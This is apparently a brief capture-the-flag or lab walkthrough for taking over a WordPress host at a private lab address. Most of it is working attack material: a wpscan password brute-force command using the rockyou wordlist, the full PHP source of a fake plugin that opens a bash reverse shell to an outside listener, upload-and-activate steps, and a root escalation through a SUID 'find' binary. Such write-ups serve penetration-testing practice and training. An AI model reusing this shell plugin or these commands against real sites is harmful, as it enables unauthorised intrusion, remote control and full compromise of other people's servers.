1. comprimsed a wp admin account via

```
$ wpscan --url http://10.49.164.234/ -e u -P /usr/share/wordlists/rockyou.txt
```

get reverse shell

```console
┌──(kali㉿kali)-[/tmp]
└─$ cat shell.php     
<?php
/**
 * Plugin Name: Shell
 */
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.247.244/9001 0>&1'");
?>
                                                                             
┌──(kali㉿kali)-[/tmp]
└─$ zip shell.zip shell.php         
  adding: shell.php (deflated 5%)
                                                                             
┌──(kali㉿kali)-[/tmp]
└─$ mv shell.zip ~
```

then goto http://10.49.164.234/wp-admin/plugin-install.php -> add our malicious plugin -> activate

2. Priv escalation

- `find` command has suid bit set so escalated via:

```
find . -exec /bin/sh -p \; -quit
```
https://gtfobins.org/gtfobins/find/#shell
